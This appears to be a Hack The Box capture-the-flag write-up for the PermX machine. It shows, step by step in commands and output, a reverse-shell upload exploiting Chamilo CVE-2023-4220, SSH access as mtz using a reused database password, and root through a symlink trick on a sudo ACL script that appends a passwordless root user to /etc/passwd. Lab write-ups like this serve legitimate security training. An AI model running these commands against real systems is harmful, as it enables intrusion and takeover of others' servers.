# Target
| Category          | Details                                               |
|-------------------|-------------------------------------------------------|
| 📝 **Name**       | [PermX](https://app.hackthebox.com/machines/PermX)    |  
| 🏷 **Type**       | HTB Machine                                           |
| 🖥 **OS**         | Linux                                                 |
| 🎯 **Difficulty** | Easy                                                  |
| 📁 **Tags**       | PHP, Chamilo, CVE-2023-4220, Metasploit, symlink, ACL |

# Scan
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Enumerate web application](#enumerate-web-application)
2. [Gain initial access by exploiting (CVE-2023-4220)](#gain-initial-access-by-exploiting-cve-2023-4220)
3. [Escalate to `mtz` user using discovered credentials](#escalate-to-mtz-user-using-discovered-credentials)
4. [Escalate to `root` user vulnerability in `/opt/acl.sh` script](#escalate-to-root-user-vulnerability-in-optaclsh-script)

### Enumerate web application

#### Add `permx.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ echo "$TARGET permx.htb" | sudo tee -a /etc/hosts
10.129.254.50 permx.htb
```

#### Enumerate virtual hosts
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ ffuf -r -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.permx.htb" -mc 200 -fs 36182

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 36182
________________________________________________

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 2732ms]
```

#### Add discovered `lms` virtual host to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ echo "$TARGET lms.permx.htb" | sudo tee -a /etc/hosts
10.129.254.50 lms.permx.htb
```

#### Discover vulnerable version of Chamilo
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ curl http://lms.permx.htb/README.md                                          
# Chamilo 1.11.x
```

### Gain initial access by exploiting [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220)

#### Generate `php/meterpreter_reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 34925 bytes
Saved as: shell.php
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload php/meterpreter_reverse_tcp; run"        
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => php/meterpreter_reverse_tcp
[*] Started reverse TCP handler on 10.10.14.161:4444 
```

#### Upload and execute generated reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ curl -s http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported -F "bigUploadFile=@shell.php" -o /dev/null && \
curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php
```

#### Gain access
```
[*] Meterpreter session 1 opened (10.10.14.161:4444 -> 10.129.254.50:47432) at 2025-05-30 14:29:34 +0200

meterpreter > getuid
Server username: www-data
```

### Escalate to `mtz` user using discovered credentials
Password discovered with `linpeas.sh`
```
grep -A7 "Database connection settings" /var/www/chamilo/app/config/configuration.php
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

#### User discovered credentials to gain access over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB PermX]
└─$ ssh mtz@permx.htb
<SNIP>
mtz@permx:~$ id
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
```

### Escalate to `root` user vulnerability in `/opt/acl.sh` script

#### List allowed sudo commands
```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

#### Locate symlink vulnerability in `/opt/acl.sh`
Vulnerability exists in line 12, as no symlink check is in place.
```
mtz@permx:~$ cat -n /opt/acl.sh 
     1  #!/bin/bash
     2
     3  if [ "$#" -ne 3 ]; then
     4      /usr/bin/echo "Usage: $0 user perm file"
     5      exit 1
     6  fi
     7
     8  user="$1"
     9  perm="$2"
    10  target="$3"
    11
    12  if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    13      /usr/bin/echo "Access denied."
    14      exit 1
    15  fi
    16
    17  # Check if the path is a file
    18  if [ ! -f "$target" ]; then
    19      /usr/bin/echo "Target must be a file."
    20      exit 1
    21  fi
    22
    23  /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

#### Exploit vulnerability
```
mtz@permx:~$ ln -s /etc /home/mtz/etc && \
sudo /opt/acl.sh mtz rw /home/mtz/etc/passwd && \
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd && \
su hacker
root@permx:/home/mtz# id
uid=0(root) gid=0(root) groups=0(root)
```